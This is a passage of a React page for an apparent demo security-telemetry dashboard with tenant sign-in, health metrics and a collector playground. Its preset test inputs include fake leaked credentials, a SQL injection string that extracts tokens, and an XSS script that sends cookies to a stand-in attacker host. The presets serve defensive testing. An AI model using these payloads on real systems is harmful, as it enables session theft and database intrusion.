'use client';

import { useState, useEffect, useCallback } from 'react';

const PRESETS = {
  clean: {
    name: 'Normal Quantum Telemetry',
    data: {
      sourceAlias: 'hyper-gateway-01',
      region: 'us-east-1',
      category: 'network',
      severity: 'low',
      latencyMs: 38,
      statusCode: 200,
      metrics: {
        throughputOps: 14200,
        subspaceJitter: 0.002,
      },
      summary: 'Quantum transit routing optimal',
    },
  },
  leak: {
    name: 'Credential Leak Attempt (DLP)',
    data: {
      sourceAlias: 'edge-auth-cluster',
      region: 'us-east-1',
      userPayload: {
        rawMessage: 'Encrypted token transmission packet',
        contactEmail: 'security-director@cyberguard.net',
        userApiKey: 'sk-live-0982341908234091823409182',
        accountPassword: 'MasterQuantumPassword99!',
        creditCard: '4532-9988-7766-5544',
        ssn: '987-65-4321',
      },
      latencyMs: 85,
      statusCode: 200,
    },
  },
  sqli: {
    name: 'Malicious SQLi Breach (Shield)',
    data: {
      sourceAlias: 'infiltrator-proxy',
      region: 'us-east-1',
      endpoint: '/api/v1/auth/quantum-login',
      searchQuery: "admin' OR '1'='1' UNION SELECT token, key_hash FROM system_vault --",
      headers: {
        userAgent: 'CyberStrike/4.2.0',
      },
    },
  },
  xss: {
    name: 'Subspace XSS Injection (Shield)',
    data: {
      sourceAlias: 'unverified-node',
      region: 'us-west-2',
      commentBody: '<script>fetch("https://dark-grid.onion/harvest?token=" + document.cookie)</script>',
    },
  },
};

export default function HomePage() {
  // Theme State: 'dark' | 'light'
  const [theme, setTheme] = useState('dark');

  // Auth & Session State
  const [sessionToken, setSessionToken] = useState(null);
  const [currentUser, setCurrentUser] = useState(null);
  const [authChecking, setAuthChecking] = useState(true);

  // Auth Form State (Sign In / Sign Up)
  const [authMode, setAuthMode] = useState('signin'); // 'signin' | 'signup'
  const [authIdentifier, setAuthIdentifier] = useState('');
  const [authPassword, setAuthPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [authTenantName, setAuthTenantName] = useState('');
  const [authRegion, setAuthRegion] = useState('us-east-1');
  const [authTier, setAuthTier] = useState('enterprise');
  const [authError, setAuthError] = useState(null);
  const [authLoading, setAuthLoading] = useState(false);

  // Active Tenant Telemetry State
  const [activeTab, setActiveTab] = useState('dashboard');
  const [loading, setLoading] = useState(false);
  const [actionMessage, setActionMessage] = useState(null);

  // AIOps Intelligence Data
  const [aiopsData, setAiopsData] = useState({
    healthScore: 100,
    healthStatus: 'HEALTHY',
    categoryHealth: {
      infra: { score: 100, status: 'HEALTHY', eventCount: 0, criticalCount: 0 },
      network: { score: 100, status: 'HEALTHY', eventCount: 0, criticalCount: 0 },
      security: { score: 100, status: 'HEALTHY', eventCount: 0, criticalCount: 0 },
      collector: { score: 100, status: 'HEALTHY', eventCount: 0, criticalCount: 0 },
    },
    isStale: false,
    summary: { totalEventsAnalyzed: 0, anomaliesCount: 0, activeIncidentsCount: 0, healthTrend: 'HEALTHY' },
    anomalies: [],
    incidents: [],
    recommendations: [],
  });

  // Collector Security Metrics
  const [collectorStats, setCollectorStats] = useState({
    totalReceived: 0,
    metadataForwarded: 0,
    rawFieldsStrippedCount: 0,
    leaksPrevented: 0,
    attacksBlocked: 0,
    attackBreakdown: {},
    leakBreakdown: {},
  });

  // Playground State
  const [playgroundInput, setPlaygroundInput] = useState(JSON.stringify(PRESETS.leak.data, null, 2));
  const [playgroundResult, setPlaygroundResult] = useState(null);
  const [playgroundRunning, setPlaygroundRunning] = useState(false);

  // Initialize Theme & Session on Mount
  useEffect(() => {
    // 1. Theme initialization
    const savedTheme = typeof window !== 'undefined' ? localStorage.getItem('cicada_theme') || 'dark' : 'dark';
    setTheme(savedTheme);
    document.documentElement.setAttribute('data-theme', savedTheme);

    // 2. Auth Session verification
    const storedToken = typeof window !== 'undefined' ? localStorage.getItem('cicada_session_token') : null;
    if (storedToken) {
      setSessionToken(storedToken);
      fetch('/api/auth?action=me', {
        headers: { Authorization: `Bearer ${storedToken}` },
      })
        .then((res) => res.json())
        .then((data) => {
          if (data.authenticated && data.user) {
            setCurrentUser(data.user);
          } else {
            localStorage.removeItem('cicada_session_token');
            setSessionToken(null);
            setCurrentUser(null);
          }
        })
        .catch(() => {
          setSessionToken(null);
          setCurrentUser(null);
        })
        .finally(() => {
          setAuthChecking(false);
        });
    } else {
      setAuthChecking(false);
    }
  }, []);

  // Theme Toggle Handler
  const toggleTheme = () => {
    const nextTheme = theme === 'dark' ? 'light' : 'dark';
    setTheme(nextTheme);
    document.documentElement.setAttribute('data-theme', nextTheme);
    localStorage.setItem('cicada_theme', nextTheme);
  };

  // Fetch Telemetry & Collector Data strictly for Authenticated Tenant
  const refreshTenantData = useCallback(async (tenantId) => {
    if (!tenantId) return;
    setLoading(true);
    try {
      const aiopsRes = await fetch(`/api/aiops?tenantId=${encodeURIComponent(tenantId)}`);
      if (aiopsRes.ok) {
        const data = await aiopsRes.json();
        setAiopsData(data);
      }

      const collectorRes = await fetch('/api/collector');
      if (collectorRes.ok) {
        const cData = await collectorRes.json();
        if (cData.stats) setCollectorStats(cData.stats);
      }
    } catch (err) {
      console.error('Failed to refresh tenant telemetry', err);
    } finally {
      setLoading(false);
    }
  }, []);

  // Sync data whenever currentUser changes
  useEffect(() => {
    if (currentUser?.tenantId) {
      refreshTenantData(currentUser.tenantId);
    }
  }, [currentUser, refreshTenantData]);

  // Auth Submission (Sign In / Sign Up)
  const handleAuthSubmit = async (e) => {
    e.preventDefault();
    setAuthError(null);
    setAuthLoading(true);

    try {
      const endpoint = `/api/auth?action=${authMode}`;
      const payload = {
        identifier: authIdentifier,
        password: authPassword,
        tenantName: authTenantName || 'My Organization',
        tier: authTier,
        region: authRegion,
      };

      const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const data = await res.json();
      if (res.ok && data.status === 'authenticated') {
        localStorage.setItem('cicada_session_token', data.token);
        setSessionToken(data.token);
        setCurrentUser(data.user);
        setActionMessage({
          type: 'success',
          text: `Authenticated partition for tenant [${data.user.tenantId}]. Credential masking and row-level isolation active.`,
        });
      } else {
        setAuthError(data.error || 'Authentication failed. Please verify credentials.');
      }
    } catch (err) {
      setAuthError('Connection error: ' + err.message);
    } finally {
      setAuthLoading(false);
    }
  };

  // Sign Out Handler
  const handleSignOut = () => {
    localStorage.removeItem('cicada_session_token');
    setSessionToken(null);
    setCurrentUser(null);
    setAuthPassword('');
    setActionMessage({ type: 'info', text: 'Securely signed out. Session token cleared.' });
  };

  // Run Simulation Scenario on Authenticated Tenant
  const handleRunSimulation = async (scenario) => {
    if (!currentUser?.tenantId) return;
    setLoading(true);
    setActionMessage({
      type: 'info',
      text: `Executing simulation scenario [${scenario}] on partition ${currentUser.tenantId}...`,
    });
    try {
      const res = await fetch('/api/simulate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ scenario, tenantId: currentUser.tenantId }),
      });
      const data = await res.json();
      if (res.ok) {
        setActionMessage({
          type: 'success',
          text: `Scenario '${scenario}' analyzed (${data.eventsGeneratedCount} events). AIOps clustered telemetry into root-cause incident.`,
        });
        await refreshTenantData(currentUser.tenantId);
      } else {
        setActionMessage({ type: 'error', text: data.error || 'Simulation failed' });
      }
    } catch (err) {
      setActionMessage({ type: 'error', text: 'Execution failure: ' + err.message });
    } finally {
      setLoading(false);
    }
  };

  // Submit to Collector Playground
  const handlePlaygroundSubmit = async () => {
    if (!currentUser?.tenantId) return;
    setPlaygroundRunning(true);
    setPlaygroundResult(null);
    try {
      let parsed;
      try {
        parsed = JSON.parse(playgroundInput);
      } catch {
        alert('Invalid JSON structure');
        setPlaygroundRunning(false);
        return;
      }

      const res = await fetch('/api/collector', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...parsed, tenantId: currentUser.tenantId }),
      });
      const data = await res.json();
      setPlaygroundResult({
        httpStatus: res.status,
        response: data,
      });
      await refreshTenantData(currentUser.tenantId);
    } catch (err) {
      setPlaygroundResult({
        httpStatus: 500,
        response: { error: err.message },
      });
    } finally {
      setPlaygroundRunning(false);
    }
  };

  // Helper color for health status
  const getHealthColor = (status) => {
    switch (status) {
      case 'HEALTHY': return 'var(--color-emerald)';
      case 'DEGRADED': return 'var(--color-amber)';
      case 'CRITICAL': return 'var(--color-rose)';
      case 'STALE': return 'var(--color-amber)';
      default: return 'var(--text-muted)';
    }
  };

  // Loading screen during initial auth verification
  if (authChecking) {
    return (
      <div style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'var(--bg-canvas)',
        color: 'var(--text-secondary)',
        fontFamily: 'var(--font-mono)',
        fontSize: '0.88rem',
      }}>
        Initializing Zero-Trust Boundary...
      </div>
    );
  }

  // ==========================================
  // UN-AUTHENTICATED: MINIMALIST AUTH PORTAL
  // ==========================================
  if (!currentUser) {
    return (
      <div style={{
        minHeight: '100vh',
        background: 'var(--bg-canvas)',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '32px 16px',
        position: 'relative',
      }}>
        {/* Top Right Theme Toggle */}
        <div style={{ position: 'absolute', top: '24px', right: '24px' }}>
          <button
            onClick={toggleTheme}
            className="btn-minimal"
            title={`Switch to ${theme === 'dark' ? 'Light' : 'Dark'} Mode`}
            style={{ fontSize: '0.8rem', padding: '6px 12px' }}
          >
            {theme === 'dark' ? '☀️ Light' : '🌙 Dark'}
          </button>
        </div>

        {/* Minimalist Brand Header */}
        <div style={{ textAlign: 'center', marginBottom: '28px', maxWidth: '480px' }}>
          <div style={{
            display: 'inline-flex',
            alignItems: 'center',
            justifyContent: 'center',
            width: '42px',
            height: '42px',
            borderRadius: '8px',
            background: 'var(--bg-surface-elevated)',
            border: '1px solid var(--border-subtle)',
            fontSize: '1.25rem',
            marginBottom: '12px',
          }}>
            ⚡
          </div>
          <h1 style={{ fontSize: '1.5rem', fontWeight: '700', letterSpacing: '-0.5px' }}>
            Cicada Telemetry
          </h1>
          <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
            Minimalist Multi-Tenant AIOps & Edge Threat Shield
          </p>
        </div>

        {/* Auth Card */}
        <div className="card-minimal" style={{ maxWidth: '440px', width: '100%', padding: '28px' }}>
          {/* Mode Switch Tabs */}
          <div style={{
            display: 'flex',
            background: 'var(--bg-canvas)',
            border: '1px solid var(--border-subtle)',
            borderRadius: '6px',
            padding: '3px',
            marginBottom: '20px',
          }}>
            <button
              onClick={() => { setAuthMode('signin'); setAuthError(null); }}
              style={{
                flex: 1,
                padding: '6px 12px',
                border: 'none',
                borderRadius: '4px',
                background: authMode === 'signin' ? 'var(--bg-surface)' : 'transparent',
                color: authMode === 'signin' ? 'var(--text-primary)' : 'var(--text-secondary)',
                fontWeight: authMode === 'signin' ? '600' : '400',
                fontSize: '0.82rem',
                cursor: 'pointer',
                boxShadow: authMode === 'signin' ? 'var(--shadow-sm)' : 'none',
              }}
            >
              Sign In
            </button>
            <button
              onClick={() => { setAuthMode('signup'); setAuthError(null); }}
              style={{
                flex: 1,
                padding: '6px 12px',
                border: 'none',
                borderRadius: '4px',
                background: authMode === 'signup' ? 'var(--bg-surface)' : 'transparent',
                color: authMode === 'signup' ? 'var(--text-primary)' : 'var(--text-secondary)',
                fontWeight: authMode === 'signup' ? '600' : '400',
                fontSize: '0.82rem',
                cursor: 'pointer',
                boxShadow: authMode === 'signup' ? 'var(--shadow-sm)' : 'none',
              }}
            >
              Create Tenant Account
            </button>
          </div>

          {authError && (
            <div style={{
              background: 'var(--color-rose-subtle)',
              border: '1px solid rgba(244, 63, 94, 0.3)',
              color: 'var(--color-rose)',
              padding: '10px 14px',
              borderRadius: '6px',
              fontSize: '0.8rem',
              marginBottom: '16px',
            }}>
              {authError}
            </div>
          )}

          <form onSubmit={handleAuthSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
            {authMode === 'signup' && (
              <div>
                <label style={{ display: 'block', fontSize: '0.78rem', fontWeight: '500', color: 'var(--text-secondary)', marginBottom: '5px' }}>
                  Organization / Tenant Name
                </label>
                <input
                  type="text"
                  required
                  placeholder="e.g. Acme Corporation"
                  value={authTenantName}
                  onChange={(e) => setAuthTenantName(e.target.value)}
                  className="input-minimal"
                />
              </div>
            )}

            <div>
              <label style={{ display: 'block', fontSize: '0.78rem', fontWeight: '500', color: 'var(--text-secondary)', marginBottom: '5px' }}>
                Email or Mobile Number
              </label>
              <input
                type="text"
                required
                placeholder="name@company.com or +1 555-123-4567"
                value={authIdentifier}
                onChange={(e) => setAuthIdentifier(e.target.value)}
                className="input-minimal"
              />
            </div>

            <div>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '5px' }}>
                <label style={{ fontSize: '0.78rem', fontWeight: '500', color: 'var(--text-secondary)' }}>
                  Password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  style={{
                    background: 'transparent',
                    border: 'none',
                    color: 'var(--accent)',
                    fontSize: '0.75rem',
                    cursor: 'pointer',
                  }}
                >
                  {showPassword ? 'Hide' : 'Show'}
                </button>
              </div>
              <input
                type={showPassword ? 'text' : 'password'}
                required
                placeholder="Min 6 characters (stored solely with you)"
                value={authPassword}
                onChange={(e) => setAuthPassword(e.target.value)}
                className="input-minimal"
              />
              <span style={{ display: 'block', fontSize: '0.7rem', color: 'var(--text-muted)', marginTop: '4px' }}>
                🔒 Passwords remain exclusively with you. Scrypt-hashed with random salt.
              </span>
            </div>

            {authMode === 'signup' && (
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px' }}>
                <div>
                  <label style={{ display: 'block', fontSize: '0.75rem', color: 'var(--text-secondary)', marginBottom: '4px' }}>
                    Tier
                  </label>
                  <select
                    value={authTier}
                    onChange={(e) => setAuthTier(e.target.value)}
                    className="input-minimal"
                    style={{ padding: '7px 10px', fontSize: '0.8rem' }}
                  >
                    <option value="enterprise">Enterprise</option>
                    <option value="pro">Pro</option>
                    <option value="starter">Starter</option>
                  </select>
                </div>
                <div>
                  <label style={{ display: 'block', fontSize: '0.75rem', color: 'var(--text-secondary)', marginBottom: '4px' }}>
                    Region
                  </label>
                  <select
                    value={authRegion}
                    onChange={(e) => setAuthRegion(e.target.value)}
                    className="input-minimal"
                    style={{ padding: '7px 10px', fontSize: '0.8rem' }}
                  >
                    <option value="us-east-1">us-east-1</option>
                    <option value="eu-west-1">eu-west-1</option>
                    <option value="us-west-2">us-west-2</option>
                    <option value="ap-southeast-1">ap-southeast-1</option>
                  </select>
                </div>
              </div>
            )}

            <button
              type="submit"
              disabled={authLoading}
              className="btn-minimal-primary"
              style={{ marginTop: '8px', width: '100%', padding: '10px' }}
            >
              {authLoading ? 'Verifying...' : authMode === 'signin' ? 'Sign In to Partition' : 'Provision Isolated Account'}
            </button>
          </form>

          {/* Quick Demo Fill Buttons */}
          <div style={{ marginTop: '22px', borderTop: '1px solid var(--border-subtle)', paddingTop: '16px' }}>
            <span style={{ display: 'block', fontSize: '0.72rem', color: 'var(--text-muted)', marginBottom: '8px' }}>
              QUICK TEST CREDENTIALS (CLICK TO AUTOFILL):
            </span>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
              <button
                type="button"
                onClick={() => {
                  setAuthMode('signin');
                  setAuthIdentifier('admin@acme.com');
                  setAuthPassword('Password123!');
                  setAuthError(null);
                }}
                className="btn-minimal"
                style={{ fontSize: '0.75rem', justifyContent: 'flex-start' }}
              >
                <span>🏢</span> <strong>Admin (Email):</strong> admin@acme.com / Password123!
              </button>
              <button
                type="button"
                onClick={() => {
                  setAuthMode('signin');
                  setAuthIdentifier('+1 555 123 4567');
                  setAuthPassword('Password123!');
                  setAuthError(null);
                }}
                className="btn-minimal"
                style={{ fontSize: '0.75rem', justifyContent: 'flex-start' }}
              >
                <span>📱</span> <strong>Ops (Mobile):</strong> +1 555 123 4567 / Password123!
              </button>
            </div>
          </div>
        </div>

        {/* Isolation & Masking Assurance Badge */}
        <div style={{ marginTop: '20px', maxWidth: '440px', textAlign: 'center', fontSize: '0.75rem', color: 'var(--text-muted)' }}>
          🛡️ <strong>Strict Tenant Isolation:</strong> Every tenant strictly views only their own telemetry data. All PII, tokens, and sensitive headers are masked automatically.
        </div>
      </div>
    );
  }

  // ==========================================
  // AUTHENTICATED: MINIMALIST SAAS DASHBOARD
  // ==========================================
  return (
    <div style={{ maxWidth: '1440px', margin: '0 auto', padding: '24px 20px', minHeight: '100vh' }}>
      {/* Top Minimalist Header */}
      <header style={{
        display: 'flex',
        flexWrap: 'wrap',
        justifyContent: 'space-between',
        alignItems: 'center',
        paddingBottom: '18px',
        borderBottom: '1px solid var(--border-subtle)',
        marginBottom: '20px',
        gap: '16px',
      }}>
        {/* Brand & Isolation Scope */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
          <div style={{
            width: '38px',
            height: '38px',
            borderRadius: '6px',
            background: 'var(--bg-surface-elevated)',
            border: '1px solid var(--border-subtle)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '1.2rem',
          }}>
            ⚡
          </div>
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <h1 style={{ fontSize: '1.25rem', fontWeight: '700', letterSpacing: '-0.3px' }}>
                Cicada Telemetry
              </h1>
              <span className="badge-minimal" style={{
                background: 'var(--color-emerald-subtle)',
                color: 'var(--color-emerald)',
                border: '1px solid rgba(16, 185, 129, 0.25)',
              }}>
                ISOLATED PARTITION
              </span>
            </div>
            <p style={{ fontSize: '0.78rem', color: 'var(--text-secondary)' }}>
              Strict Zero-Cross-Tenant Isolation · PII & Credential Masking Enforced
            </p>
          </div>
        </div>

        {/* User Profile & Theme & Sign Out Controls */}
        <div style={{ display: 'flex', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
          {/* Masked User Badge */}
          <div style={{
            background: 'var(--bg-surface)',
            border: '1px solid var(--border-subtle)',
            borderRadius: '6px',
            padding: '5px 12px',
            fontSize: '0.8rem',
            display: 'flex',
            alignItems: 'center',
            gap: '8px',
          }}>
            <span style={{ color: 'var(--text-muted)' }}>Tenant:</span>
            <strong style={{ color: 'var(--text-primary)' }}>{currentUser.tenantId}</strong>
            <span style={{ color: 'var(--border-subtle)' }}>|</span>
            <span style={{ color: 'var(--text-muted)' }}>User:</span>
            <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--accent)' }}>
              {currentUser.maskedIdentifier}
            </span>
          </div>

          {/* Refresh Data */}
          <button
            onClick={() => refreshTenantData(currentUser.tenantId)}
            disabled={loading}
            className="btn-minimal"
            title="Sync latest tenant telemetry"
          >
            <span>🔄</span> {loading ? 'Syncing...' : 'Sync'}
          </button>

          {/* Dark / Light Mode Toggle */}
          <button
            onClick={toggleTheme}
            className="btn-minimal"
            title={`Switch to ${theme === 'dark' ? 'Light' : 'Dark'} Mode`}
          >
            {theme === 'dark' ? '☀️ Light' : '🌙 Dark'}
          </button>

          {/* Sign Out Button */}
          <button
            onClick={handleSignOut}
            className="btn-minimal-danger"
            title="Sign out of tenant partition"
          >
            Sign Out
          </button>
        </div>
      </header>

      {/* Tenant Partition Notice Bar */}
      <section style={{
        background: 'var(--bg-surface)',
        border: '1px solid var(--border-subtle)',
        borderRadius: '6px',
        padding: '10px 16px',
        marginBottom: '20px',
        display: 'flex',
        flexWrap: 'wrap',
        alignItems: 'center',
        justifyContent: 'space-between',
        fontSize: '0.8rem',
        gap: '12px',
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '18px', flexWrap: 'wrap' }}>
          <span>
            <strong style={{ color: 'var(--text-secondary)' }}>Partition ID:</strong> <code>{currentUser.tenantId}</code>
          </span>
          <span>
            <strong style={{ color: 'var(--text-secondary)' }}>Credentials:</strong> <span style={{ color: 'var(--color-emerald)' }}>Masked (PII Redacted)</span>
          </span>
          <span>
            <strong style={{ color: 'var(--text-secondary)' }}>Password:</strong> <span style={{ color: 'var(--text-muted)' }}>Protected (Tenant Only)</span>
          </span>
        </div>
        <div style={{ color: 'var(--color-emerald)', display: 'flex', alignItems: 'center', gap: '6px', fontSize: '0.76rem', fontWeight: '600' }}>
          <span style={{ display: 'inline-block', width: '7px', height: '7px', borderRadius: '50%', background: 'var(--color-emerald)' }}></span>
          Cross-Tenant Visibility: Blocked
        </div>
      </section>

      {/* System Notifications */}
      {actionMessage && (
        <div style={{
          padding: '10px 16px',
          borderRadius: '6px',
          marginBottom: '20px',
          fontSize: '0.82rem',
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          backgroundColor: actionMessage.type === 'error' ? 'var(--color-rose-subtle)' : 'var(--accent-subtle)',
          border: `1px solid ${actionMessage.type === 'error' ? 'rgba(244, 63, 94, 0.3)' : 'var(--border-accent)'}`,
          color: actionMessage.type === 'error' ? 'var(--color-rose)' : 'var(--text-primary)',
        }}>
          <span>{actionMessage.text}</span>
          <button
            onClick={() => setActionMessage(null)}
            style={{ background: 'transparent', border: 'none', color: 'inherit', cursor: 'pointer', fontSize: '0.9rem' }}
          >
            ✕
          </button>
        </div>
      )}

      {/* Top KPI Cards Row */}
      <section style={{
        display: 'grid',
        gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))',
        gap: '16px',
        marginBottom: '22px',
      }}>
        {/* Health Score */}
        <div className="card-minimal" style={{ padding: '18px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '0.78rem', color: 'var(--text-secondary)', fontWeight: '500' }}>
              Partition Health Index
            </span>
            <span className="badge-minimal" style={{
              backgroundColor: `${getHealthColor(aiopsData.healthStatus)}18`,
              color: getHealthColor(aiopsData.healthStatus),
              border: `1px solid ${getHealthColor(aiopsData.healthStatus)}35`,
            }}>
              {aiopsData.healthStatus}
            </span>
          </div>
          <div style={{ display: 'flex', alignItems: 'baseline', gap: '6px', marginTop: '10px' }}>
            <span style={{ fontSize: '2.4rem', fontWeight: '700', color: getHealthColor(aiopsData.healthStatus) }}>
              {aiopsData.healthScore}
            </span>
            <span style={{ color: 'var(--text-muted)', fontSize: '0.85rem' }}>/ 100.0</span>
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
            Trend: <strong>{aiopsData.summary?.healthTrend || 'HEALTHY'}</strong>
          </div>
        </div>

        {/* Active Incidents */}
        <div className="card-minimal" style={{ padding: '18px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '0.78rem', color: 'var(--text-secondary)', fontWeight: '500' }}>
              Active Incidents
            </span>
            <span style={{ fontSize: '1rem' }}>🚨</span>
          </div>
          <div style={{
            fontSize: '2.4rem',
            fontWeight: '700',
            marginTop: '10px',
            color: aiopsData.incidents?.length > 0 ? 'var(--color-rose)' : 'var(--text-primary)',
          }}>
            {aiopsData.incidents?.length || 0}
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
            Correlated multi-tier root causes
          </div>
        </div>

        {/* DLP Leaks Purged */}
        <div className="card-minimal" style={{ padding: '18px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '0.78rem', color: 'var(--text-secondary)', fontWeight: '500' }}>
              DLP Leaks Purged
            </span>
            <span style={{ fontSize: '1rem' }}>🔒</span>
          </div>
          <div style={{ fontSize: '2.4rem', fontWeight: '700', marginTop: '10px', color: 'var(--accent)' }}>
            {collectorStats.leaksPrevented}
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
            Credentials & PII redacted
          </div>
        </div>

        {/* Attacks Mitigated */}
        <div className="card-minimal" style={{ padding: '18px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '0.78rem', color: 'var(--text-secondary)', fontWeight: '500' }}>
              Threats Neutralized
            </span>
            <span style={{ fontSize: '1rem' }}>🛡️</span>
          </div>
          <div style={{ fontSize: '2.4rem', fontWeight: '700', marginTop: '10px', color: 'var(--color-purple)' }}>
            {collectorStats.attacksBlocked}
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
            SQLi, XSS, DDoS & exploits dropped
          </div>
        </div>
      </section>

      {/* Simulator Action Banner */}
      <section className="card-minimal" style={{
        padding: '16px 20px',
        marginBottom: '22px',
        display: 'flex',
        flexWrap: 'wrap',
        alignItems: 'center',
        justifyContent: 'space-between',
        gap: '12px',
      }}>
        <div>
          <span style={{ fontSize: '0.8rem', fontWeight: '600', color: 'var(--accent)' }}>
            Neural Telemetry Simulator
          </span>
          <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginTop: '2px' }}>
            Inject test telemetry into partition <code>{currentUser.tenantId}</code> to verify real-time AI anomaly detection and incident correlation.
          </p>
        </div>

        <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px' }}>
          <button
            onClick={() => handleRunSimulation('spikes')}
            disabled={loading}
            className="btn-minimal"
          >
            <span>⚡</span> Latency Spike
          </button>
          <button
            onClick={() => handleRunSimulation('outages')}
            disabled={loading}
            className="btn-minimal-danger"
          >
            <span>💥</span> Cascading Outage
          </button>
          <button
            onClick={() => handleRunSimulation('failed_logins')}
            disabled={loading}
            className="btn-minimal"
          >
            <span>🛡️</span> Cyber Attack Simulation
          </button>
        </div>
      </section>

      {/* Navigation Tabs */}
      <nav style={{
        display: 'flex',
        borderBottom: '1px solid var(--border-subtle)',
        marginBottom: '22px',
        gap: '4px',
        overflowX: 'auto',
      }}>
        {[
          { id: 'dashboard', label: '📊 Telemetry & AIOps' },
          { id: 'partition', label: '🏢 Tenant Partition Status' },
          { id: 'shield', label: '🛡️ Threat Shield & DLP' },
          { id: 'playground', label: '🧪 Collector Playground' },
          { id: 'api', label: '🔌 Architecture & Endpoints' },
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id)}
            style={{
              background: 'transparent',
              border: 'none',
              borderBottom: activeTab === tab.id ? '2px solid var(--accent)' : '2px solid transparent',
              color: activeTab === tab.id ? 'var(--text-primary)' : 'var(--text-secondary)',
              padding: '9px 16px',
              fontSize: '0.84rem',
              fontWeight: activeTab === tab.id ? '600' : '400',
              cursor: 'pointer',
              whiteSpace: 'nowrap',
            }}
          >
            {tab.label}
          </button>
        ))}
      </nav>

      {/* TAB 1: Telemetry & AIOps Dashboard */}
      {activeTab === 'dashboard' && (
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(360px, 1fr))', gap: '20px' }}>
          {/* Domain Breakdown */}
          <div className="card-minimal" style={{ padding: '20px' }}>
            <h3 style={{ fontSize: '0.92rem', fontWeight: '600', marginBottom: '14px' }}>
              Operational Domain Telemetry
            </h3>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
              {Object.entries(aiopsData.categoryHealth || {}).map(([cat, stats]) => (
                <div key={cat} style={{ background: 'var(--bg-canvas)', padding: '12px 14px', borderRadius: '6px', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                    <span style={{ textTransform: 'capitalize', fontWeight: '600', fontSize: '0.82rem' }}>{cat}</span>
                    <span style={{ fontSize: '0.8rem', fontWeight: '600', color: getHealthColor(stats.status) }}>
                      {stats.score} / 100 [{stats.status}]
                    </span>
                  </div>
                  <div style={{ width: '100%', height: '5px', background: 'var(--border-subtle)', borderRadius: '3px', overflow: 'hidden' }}>
                    <div style={{
                      width: `${stats.score}%`,
                      height: '100%',
                      background: getHealthColor(stats.status),
                      transition: 'width 0.4s ease',
                    }} />
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.72rem', color: 'var(--text-muted)', marginTop: '5px' }}>
                    <span>Events: {stats.eventCount}</span>
                    <span>Critical alerts: {stats.criticalCount}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Anomaly Detection Radar */}
          <div className="card-minimal" style={{ padding: '20px' }}>
            <h3 style={{ fontSize: '0.92rem', fontWeight: '600', marginBottom: '14px' }}>
              Baseline Anomaly Detection (Z ≥ 2.0)
            </h3>
            {(!aiopsData.anomalies || aiopsData.anomalies.length === 0) ? (
              <div style={{ padding: '36px', textAlign: 'center', color: 'var(--text-muted)', fontSize: '0.82rem' }}>
                All metric series conform to established statistical baselines.
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', maxHeight: '360px', overflowY: 'auto' }}>
                {aiopsData.anomalies.slice(0, 6).map((anom, idx) => (
                  <div key={idx} style={{
                    background: 'var(--bg-canvas)',
                    border: '1px solid var(--border-subtle)',
                    borderRadius: '6px',
                    padding: '10px 12px',
                    fontSize: '0.78rem',
                  }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
                      <span style={{ fontWeight: '600', color: 'var(--color-rose)' }}>
                        {anom.sourceAlias} [{anom.category}]
                      </span>
                      <span style={{ color: 'var(--text-muted)' }}>Score: {anom.anomalyScore}</span>
                    </div>
                    <ul style={{ paddingLeft: '16px', color: 'var(--text-secondary)' }}>
                      {anom.reasons?.map((r, rIdx) => (
                        <li key={rIdx}>{r}</li>
                      ))}
                    </ul>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Correlated Incidents & Root Cause Analysis */}
          <div className="card-minimal" style={{ gridColumn: '1 / -1', padding: '20px' }}>
            <h3 style={{ fontSize: '0.95rem', fontWeight: '600', marginBottom: '16px' }}>
